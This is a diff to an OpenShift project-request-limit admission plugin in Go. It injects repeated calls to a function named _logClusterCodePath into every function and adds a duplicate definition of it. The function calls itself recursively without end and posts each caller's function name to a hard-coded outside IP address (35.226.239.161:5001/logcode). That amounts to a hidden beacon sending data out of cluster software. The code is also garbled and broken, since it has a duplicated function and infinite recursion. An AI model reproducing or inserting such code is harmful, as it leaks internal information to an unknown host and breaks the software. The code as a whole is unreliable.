@@ -48,6 +48,8 @@ func Register(plugins *admission.Plugins) {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	plugins.Register("project.openshift.io/ProjectRequestLimit", func(config io.Reader) (admission.Interface, error) {
 		pluginConfig, err := readConfig(config)
 		if err != nil {
@@ -61,6 +63,8 @@ func Register(plugins *admission.Plugins) {
 	})
 }
 func readConfig(reader io.Reader) (*requestlimitapi.ProjectRequestLimitConfig, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -120,6 +124,8 @@ func (o *projectRequestLimit) Validate(a admission.Attributes) (err error) {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	if o.config == nil {
 		return nil
 	}
@@ -149,6 +155,8 @@ func (o *projectRequestLimit) Validate(a admission.Attributes) (err error) {
 	return nil
 }
 func (o *projectRequestLimit) maxProjectsByRequester(userName string) (int, bool, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -209,6 +217,8 @@ func (o *projectRequestLimit) projectCountByRequester(userName string) (int, err
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	allNamespaces, err := o.nsLister.List(labels.Everything())
 	if err != nil {
 		return 0, err
@@ -249,6 +259,8 @@ func (o *projectRequestLimit) SetRESTClientConfig(restClientConfig rest.Config) 
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	var err error
 	o.userClient, err = usertypedclient.NewForConfig(&restClientConfig)
 	if err != nil {
@@ -257,6 +269,8 @@ func (o *projectRequestLimit) SetRESTClientConfig(restClientConfig rest.Config) 
 	}
 }
 func (o *projectRequestLimit) SetExternalKubeInformerFactory(kubeInformers informers.SharedInformerFactory) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -289,6 +303,8 @@ func (o *projectRequestLimit) waitForSyncedStore(timeout <-chan time.Time) bool 
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	for !o.nsListerSynced() {
 		select {
 		case <-time.After(100 * time.Millisecond):
@@ -299,6 +315,8 @@ func (o *projectRequestLimit) waitForSyncedStore(timeout <-chan time.Time) bool 
 	return true
 }
 func (o *projectRequestLimit) ValidateInitialization() error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -339,6 +357,8 @@ func NewProjectRequestLimit(config *requestlimitapi.ProjectRequestLimitConfig) (
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return &projectRequestLimit{config: config, Handler: admission.NewHandler(admission.Create)}, nil
 }
 func _logClusterCodePath() {
@@ -356,6 +376,27 @@ func _logClusterCodePath() {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
@@ -430,5 +471,5 @@ func _logClusterCodePath() {
 	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
-	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
